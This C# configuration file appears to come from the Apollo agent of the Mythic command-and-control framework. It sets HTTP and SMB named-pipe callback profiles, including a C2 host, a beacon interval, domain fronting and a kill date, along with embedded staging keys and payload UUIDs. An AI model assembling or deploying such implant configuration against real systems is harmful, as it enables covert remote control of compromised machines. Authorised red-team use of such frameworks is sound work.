#define HTTP


using HttpTransport;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Structs.ApolloStructs;
using PSKCryptography;
using ApolloInterop.Serializers;
using NamedPipeTransport;

namespace Apollo
{
    public static class Config
    {
        public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()
        {
#if HTTP
            { "http", new C2ProfileData()
                {
                    TC2Profile = typeof(HttpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
                        { "callback_interval", "5" },
                        { "callback_jitter", "0" },
                        { "callback_port", "80" },
                        { "callback_host", "http://mythic" },
                        { "post_uri", "data" },
                        { "encrypted_exchange_check", "T" },
                        { "proxy_host", "" },
                        { "proxy_port", "" },
                        { "proxy_user", "" },
                        { "proxy_pass", "" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Apollo-Refactor" }
                    }
                }
            },
#endif
#if SMB
            { "smb", new C2ProfileData()
                {
                    TC2Profile = typeof(NamedPipeProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
                        { "pipename", "6e7tvpfc-ggqp-yjsg-i4gf-1cfwoas5kyxr" },
                        { "encrypted_exchange_check", "T" },
                    }
                }
            }
#endif
        };


        public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
#if HTTP
        public static string StagingRSAPrivateKey = "ACstCeIXHEqdn/QM3YsAX24yfRUX6JBtOdhkAwnfQrw=";
#elif SMB
        public static string StagingRSAPrivateKey = "VP/v4tUOxp2q/SK7Xsw5NRiblpHkfO0fMQ8nM02F+AY=";
#endif
#if HTTP
        public static string PayloadUUID = "9f006dd8-7036-455b-99ed-d0b5f19ba921";
#elif SMB
        public static string PayloadUUID = "3c3c7598-1a3a-45e3-8af3-416410f93848";
#endif
    }
}
